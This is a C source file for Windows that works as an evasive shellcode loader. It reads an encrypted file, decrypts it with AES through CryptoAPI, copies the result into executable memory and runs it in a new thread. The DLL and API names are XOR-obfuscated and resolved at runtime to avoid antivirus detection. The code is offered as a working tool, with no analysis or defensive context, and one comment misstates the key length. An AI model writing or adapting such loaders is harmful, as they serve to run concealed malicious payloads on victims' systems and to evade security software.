#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>



BOOL (WINAPI *pCryptAcquireContextA)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
BOOL (WINAPI *pCryptCreateHash)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
BOOL (WINAPI *pCryptHashData)(HCRYPTHASH, const BYTE*, DWORD, DWORD);
BOOL (WINAPI *pCryptDeriveKey)(HCRYPTPROV, ALG_ID, HCRYPTHASH, DWORD, HCRYPTKEY*);
BOOL (WINAPI *pCryptSetKeyParam)(HCRYPTKEY, DWORD, const BYTE*, DWORD);
BOOL (WINAPI *pCryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);
BOOL (WINAPI *pCryptDestroyKey)(HCRYPTKEY);
BOOL (WINAPI *pCryptDestroyHash)(HCRYPTHASH);
BOOL (WINAPI *pCryptReleaseContext)(HCRYPTPROV, DWORD);
LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
BOOL (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
HANDLE (WINAPI *pCreateFileA)(
           LPCSTR                ,
           DWORD                 ,
             DWORD                 ,
   LPSECURITY_ATTRIBUTES ,
            DWORD                 ,
           DWORD                 ,
   HANDLE                
);

BOOL (WINAPI *pReadFile)(
                HANDLE       ,
               LPVOID       ,
                 DWORD        ,
     LPDWORD      ,
   LPOVERLAPPED 
);


void xor(char *payload, size_t len) {
    const char key[] = "123456789";
    const size_t key_len = sizeof(key) - 1; // Exclude null terminator

    if (!payload || len == 0 || key_len == 0) return;

    for (size_t i = 0; i < len; i++) {
        payload[i] ^= key[i % key_len];
    }
}



int decryptAndExecute(BYTE* encryptedData, DWORD dataSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;

        char kernel32[]= {0x5a, 0x57, 0x41, 0x5a, 0x50, 0x5a, 0x04, 0x0a, 0x17, 0x55, 0x5e, 0x5f,0x00};
    char advapi32[]= {0x50, 0x56, 0x45, 0x55, 0x45, 0x5f, 0x04, 0x0a, 0x17, 0x55, 0x5e, 0x5f,0x00};

   char CryptAcquireContextnA[]= {0x72, 0x40, 0x4a, 0x44, 0x41, 0x77, 0x54, 0x49, 0x4c, 0x58, 0x40, 0x56, 0x77, 0x5a, 0x58, 0x43, 0x5d, 0x41, 0x45, 0x73, 0x00};
char CryptCreateHashn[]=      {0x72, 0x40, 0x4a, 0x44, 0x41, 0x75, 0x45, 0x5d, 0x58, 0x45, 0x57, 0x7b, 0x55, 0x46, 0x5e, 0x00};
char CryptHashDatan[]=        {0x72, 0x40, 0x4a, 0x44, 0x41, 0x7e, 0x56, 0x4b, 0x51, 0x75, 0x53, 0x47, 0x55, 0x00};
char CryptDeriveKeyn[]=       {0x72, 0x40, 0x4a, 0x44, 0x41, 0x72, 0x52, 0x4a, 0x50, 0x47, 0x57, 0x78, 0x51, 0x4c, 0x00};
char CryptSetKeyParamn[]=    {0x72, 0x40, 0x4a, 0x44, 0x41, 0x65, 0x52, 0x4c, 0x72, 0x54, 0x4b, 0x63, 0x55, 0x47, 0x57, 0x5a, 0x00};
char CryptDecryptn[]=        {0x72, 0x40, 0x4a, 0x44, 0x41, 0x72, 0x52, 0x5b, 0x4b, 0x48, 0x42, 0x47, 0x00};
char CryptDestroyKeyn[]=     {0x72, 0x40, 0x4a, 0x44, 0x41, 0x72, 0x52, 0x4b, 0x4d, 0x43, 0x5d, 0x4a, 0x7f, 0x50, 0x4f, 0x00};
char CryptDestroyHashn[]=    {0x72, 0x40, 0x4a, 0x44, 0x41, 0x72, 0x52, 0x4b, 0x4d, 0x43, 0x5d, 0x4a, 0x7c, 0x54, 0x45, 0x5f, 0x00};
char CryptReleaseContextn[]=  {0x72, 0x40, 0x4a, 0x44, 0x41, 0x64, 0x52, 0x54, 0x5c, 0x50, 0x41, 0x56, 0x77, 0x5a, 0x58, 0x43, 0x5d, 0x41, 0x45, 0x00};
char VirtualAllocn[]=        {0x67, 0x5b, 0x41, 0x40, 0x40, 0x57, 0x5b, 0x79, 0x55, 0x5d, 0x5d, 0x50, 0x00};
char VirtualFreen[]=          {0x67, 0x5b, 0x41, 0x40, 0x40, 0x57, 0x5b, 0x7e, 0x4b, 0x54, 0x57, 0x00};
char CreateThreadn[]=         {0x72, 0x40, 0x56, 0x55, 0x41, 0x53, 0x63, 0x50, 0x4b, 0x54, 0x53, 0x57, 0x00};
char VirtualAlloc[] = {0x67, 0x5b, 0x41, 0x40, 0x40, 0x57, 0x5b, 0x79, 0x55, 0x5d, 0x5d, 0x50,0x00};
char VirtualFree[]=      {0x67, 0x5b, 0x41, 0x40, 0x40, 0x57, 0x5b, 0x7e, 0x4b, 0x54, 0x57,0x00};
char CreateThread[]=        {0x72, 0x40, 0x56, 0x55, 0x41, 0x53, 0x63, 0x50, 0x4b, 0x54, 0x53, 0x57,0x00};
xor(kernel32, sizeof(kernel32) - 1);
xor(advapi32, sizeof(advapi32) - 1);
HMODULE hAdvapi = LoadLibraryA(advapi32);
HMODULE hKernel32 = LoadLibraryA(kernel32);




    xor(CreateThreadn, sizeof(CreateThreadn) - 1);
    xor(VirtualAllocn, sizeof(VirtualAllocn) - 1);
    xor(VirtualFreen, sizeof(VirtualFreen) - 1);
    xor(CryptAcquireContextnA, sizeof(CryptAcquireContextnA) - 1);
    xor(CryptCreateHashn, sizeof(CryptCreateHashn) - 1);
    xor(CryptHashDatan, sizeof(CryptHashDatan) - 1);
    xor(CryptDeriveKeyn, sizeof(CryptDeriveKeyn) - 1);
    xor(CryptSetKeyParamn, sizeof(CryptSetKeyParamn) - 1);
    xor(CryptDecryptn, sizeof(CryptDecryptn) - 1);
    xor(CryptDestroyKeyn, sizeof(CryptDestroyKeyn) - 1);
    xor(CryptDestroyHashn, sizeof(CryptDestroyHashn) - 1);
    xor(CryptReleaseContextn, sizeof(CryptReleaseContextn) - 1);
    xor(VirtualAlloc, sizeof(VirtualAlloc) - 1);
    xor(VirtualFree, sizeof(VirtualFree) - 1);
    xor(CreateThread, sizeof(CreateThread) - 1);

    pCryptAcquireContextA = (void*)GetProcAddress(hAdvapi, CryptAcquireContextnA);
    pCryptCreateHash = (void*)GetProcAddress(hAdvapi, CryptCreateHashn);
    pCryptHashData = (void*)GetProcAddress(hAdvapi, CryptHashDatan);
    pCryptDeriveKey = (void*)GetProcAddress(hAdvapi, CryptDeriveKeyn);
    pCryptSetKeyParam = (void*)GetProcAddress(hAdvapi, CryptSetKeyParamn);
    pCryptDecrypt = (void*)GetProcAddress(hAdvapi, CryptDecryptn);
    pCryptDestroyKey = (void*)GetProcAddress(hAdvapi, CryptDestroyKeyn);
    pCryptDestroyHash = (void*)GetProcAddress(hAdvapi, CryptDestroyHashn);
    pCryptReleaseContext = (void*)GetProcAddress(hAdvapi, CryptReleaseContextn);
    pVirtualAlloc = (void*)GetProcAddress(hKernel32, VirtualAlloc);
    pVirtualFree = (void*)GetProcAddress(hKernel32, VirtualFree);
    pCreateThread = (void*)GetProcAddress(hKernel32, CreateThread);

    // AES-256 key (32 bytes for AES-256)
    BYTE key[] = { 
        0x63, 0xf0, 0x7f, 0x9c, 0x8a, 0x88, 0x59, 0x58,
        0x89, 0x80, 0x19, 0xd2, 0xa6, 0x72, 0xb7, 0x55
    };
    DWORD keySize = sizeof(key);

    // Initialize CSP
    if (!pCryptAcquireContextA(&hProv, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("[!] CryptAcquireContext failed: %d\n", GetLastError());
        return 1;
    }

    // Create hash object
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("[!] CryptCreateHash failed: %d\n", GetLastError());
        pCryptReleaseContext(hProv, 0);
        return 1;
    }

    // Hash the key
    if (!pCryptHashData(hHash, key, keySize, 0)) {
        printf("[!] CryptHashData failed: %d\n", GetLastError());
        pCryptDestroyHash(hHash);
        pCryptReleaseContext(hProv, 0);
        return 1;
    }

    // Derive the AES key
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {
        printf("[!] CryptDeriveKey failed: %d\n", GetLastError());
        pCryptDestroyHash(hHash);
        pCryptReleaseContext(hProv, 0);
        return 1;
    }

    // Set CBC mode
    DWORD mode = CRYPT_MODE_CBC;
    if (!pCryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        printf("[!] CryptSetKeyParam failed: %d\n", GetLastError());
        pCryptDestroyKey(hKey);
        pCryptDestroyHash(hHash);
        pCryptReleaseContext(hProv, 0);
        return 1;
    }

    // Set IV (should match what was used for encryption)
    BYTE iv[16] = {0}; // Use your actual IV here
    if (!pCryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        printf("[!] CryptSetKeyParam IV failed: %d\n", GetLastError());
        pCryptDestroyKey(hKey);
        pCryptDestroyHash(hHash);
        pCryptReleaseContext(hProv, 0);
        return 1;
    }

    // Decrypt in-place
    if (!pCryptDecrypt(hKey, 0, TRUE, 0, encryptedData, &dataSize)) {
        printf("[!] CryptDecrypt failed: %d\n", GetLastError());
        pCryptDestroyKey(hKey);
        pCryptDestroyHash(hHash);
        pCryptReleaseContext(hProv, 0);
        return 1;
    }

    // Allocate executable memory
    LPVOID execMem = pVirtualAlloc(NULL, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        printf("[!] VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Copy decrypted payload
    memcpy(execMem, encryptedData, dataSize);

    // Execute
    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        printf("[!] CreateThread failed: %d\n", GetLastError());
        pVirtualFree(execMem, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    pVirtualFree(execMem, 0, MEM_RELEASE);
    pCryptDestroyKey(hKey);
    pCryptDestroyHash(hHash);
    pCryptReleaseContext(hProv, 0);

    return 0;
}

int main() {

    char kernel32[]= {0x5a, 0x57, 0x41, 0x5a, 0x50, 0x5a, 0x04, 0x0a, 0x17, 0x55, 0x5e, 0x5f,0x00};
char CreateFileA[]=      {0x72, 0x40, 0x56, 0x55, 0x41, 0x53, 0x71, 0x51, 0x55, 0x54, 0x73,0x00};
char ReadFile[]=        {0x63, 0x57, 0x52, 0x50, 0x73, 0x5f, 0x5b, 0x5d,0x00};
xor(CreateFileA, sizeof(CreateFileA) - 1);
xor(ReadFile, sizeof(ReadFile) - 1);
xor(kernel32, sizeof(kernel32) - 1);
    HMODULE hKernel32 = LoadLibraryA(kernel32);
    if (!hKernel32) {
        printf("[!] LoadLibrary failed: %d\n", GetLastError());
        return 1;
    }
    pCreateFileA = GetProcAddress(hKernel32, CreateFileA);
    pReadFile = GetProcAddress(hKernel32, ReadFile);
    

    HANDLE hFile = pCreateFileA(
        "encrypted.bin", 
        GENERIC_READ, 
        0, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile failed: %d\n", GetLastError());
        return 1;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] GetFileSize failed: %d\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // Allocate buffer
    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        printf("[!] Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    // Read file
    DWORD bytesRead;
    if (!pReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] ReadFile failed: %d\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    // Decrypt and execute
    int result = decryptAndExecute(buffer, fileSize);

    free(buffer);
    return result;
}